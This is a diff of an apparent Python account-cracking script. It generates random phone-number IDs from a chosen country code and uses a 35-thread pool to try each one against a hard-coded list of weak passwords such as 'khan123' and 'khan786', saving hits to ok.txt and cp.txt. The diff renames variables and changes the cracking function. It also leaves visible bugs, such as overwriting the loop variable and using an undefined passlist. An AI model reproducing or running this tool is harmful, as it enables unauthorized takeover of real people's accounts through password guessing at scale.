@@ -654,7 +654,7 @@ def zee1():
 		menu()
 #____
 def random_number1():
-	uid=[]
+	ids=[]
 	os.system('clear')
 	print(logo)
 	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
@@ -667,19 +667,19 @@ def random_number1():
 	limit = int(input('[+] Putt Ypur Idz limit :  '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		uid.append(nmp)
+		ids.append(nmp)
 	with ThreadPool(max_workers=35) as yaari:
 		os.system('clear')
 		print(logo)
-		tl = str(len(uid))
+		tl = str(len(ids))
 		print(' Total Acounts : '+tl)
 		print(' Selected Code : \x1b[1;92m'+kode)
 		print('\x1b[1;91m If show no result use flight mode')
 		linex()
-		for guru in uid:
-			uid = kode+guru
+		for guru in ids:
+			ids = kode+guru
 			pwx = [guru,kode]
-			yaari.submit(fcrack,uid,pwx,tl)
+			yaari.submit(m1,ids,passlist)
 	linex()
 	print('[✓] Crack process has been completed')
 	print('[?] Idz saved in [ok.txt,cp.txt]')
@@ -688,7 +688,7 @@ def random_number1():
 	menu()
 #_______
 def random_number2():
-	uid=[]
+	ids=[]
 	os.system('clear')
 	print(logo)
 	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
@@ -701,19 +701,19 @@ def random_number2():
 	limit = int(input('[+] Putt Ypur Idz lemit :  '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		uid.append(nmp)
+		ids.append(nmp)
 	with ThreadPool(max_workers=35) as yaari:
 		os.system('clear')
 		print(logo)
-		tl = str(len(uid))
+		tl = str(len(ids))
 		print(' Total Acounts : '+tl)
 		print(' Selected Code : \x1b[1;92m'+kode)
 		print('\x1b[1;91m If show no result use flight mode')
 		linex()
-		for guru in uid:
-			uid = kode+guru
-			pwx = [guru,kode,'khankhan','khan12','khan1122','khan123456','khan123','khankhan123','khankhan12','khan786','khan007','khan khan','khan1234','khan12345']
-			yaari.submit(fcrack,uid,pwx,tl)
+		for guru in ids:
+			ids = kode+guru
+			passlist = [guru,kode,'khankhan','khan12','khan1122','khan123456','khan123','khankhan123','khankhan12','khan786','khan007','khan khan','khan1234','khan12345']
+			yaari.submit(m1,ids,passlist)
 	linex()
 	print('[✓] Crack process has been completed')
 	print('[?] Idz saved in [ok.txt,cp.txt]')
